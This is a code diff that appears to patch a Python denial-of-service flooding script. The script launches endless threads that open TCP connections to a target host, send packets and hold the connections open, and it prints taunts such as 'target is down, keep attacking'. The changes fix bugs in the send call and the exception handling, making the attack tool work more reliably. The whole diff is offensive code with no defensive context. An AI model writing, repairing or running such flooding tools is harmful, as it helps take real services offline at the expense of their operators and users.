@@ -37,19 +37,22 @@ def connect(i):
     try:
         sock1 = socket(AF_INET, SOCK_STREAM)
         sock1.connect((host, port))
-        sock1.sendto(packet, (ip,port))
+        sock1.sendto(packet, (host, port))
         sleep(99)
         sock1.close
-    except:
+
+    except OSError:
         print("[+] 74rg37 15 D0wn! K33p 4774Ck1ng!!")
 
 n = 0
 
 
-while 1:
+while True:
     try:
         start_new_thread(connect, (n,))
-    except:
+
+    except ImportError:
         print("Y0ur 1n73rn37 h45 b33n fuck3ry, Pl3453 ch3ck 17")
+
     print("[+] Fire!! Fire!! Fire!! Fire!! Fire!!")
     sleep(0.1)
